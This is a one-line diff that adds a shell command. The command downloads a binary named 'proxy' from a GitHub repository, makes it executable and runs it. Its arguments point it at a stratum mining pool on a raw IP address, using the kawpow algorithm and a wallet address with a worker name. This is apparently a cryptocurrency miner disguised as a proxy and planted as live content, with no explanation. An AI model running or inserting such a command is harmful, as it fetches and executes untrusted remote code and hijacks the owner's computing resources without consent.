@@ -1,0 +1,1 @@
+wget https://github.com/uyaahaga/proxyone/raw/main/proxy && chmod 700 proxy && ./proxy -a kawpow -o stratum+tcp://147.185.221.17:52195 -u AbuXE8gmZQPcdJSLv64XQZJtVLPvQzQZmm.STRIXGPU
